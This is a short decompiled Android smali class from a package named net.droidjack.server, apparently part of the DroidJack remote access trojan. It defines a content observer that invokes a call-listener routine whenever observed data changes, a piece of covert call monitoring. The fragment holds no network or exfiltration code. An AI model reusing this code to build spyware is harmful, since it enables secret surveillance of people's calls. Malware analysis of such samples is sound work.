.class Lnet/droidjack/server/d;
.super Landroid/database/ContentObserver;


# instance fields
.field final synthetic a:Lnet/droidjack/server/CallListener;


# direct methods
.method public constructor <init>(Lnet/droidjack/server/CallListener;Landroid/os/Handler;)V
    .locals 0

    iput-object p1, p0, Lnet/droidjack/server/d;->a:Lnet/droidjack/server/CallListener;

    invoke-direct {p0, p2}, Landroid/database/ContentObserver;-><init>(Landroid/os/Handler;)V

    return-void
.end method


# virtual methods
.method public deliverSelfNotifications()Z
    .locals 1

    const/4 v0, 0x1

    return v0
.end method

.method public onChange(Z)V
    .locals 1

    invoke-super {p0, p1}, Landroid/database/ContentObserver;->onChange(Z)V

    iget-object v0, p0, Lnet/droidjack/server/d;->a:Lnet/droidjack/server/CallListener;

    invoke-virtual {v0}, Lnet/droidjack/server/CallListener;->b()V

    return-void
.end method
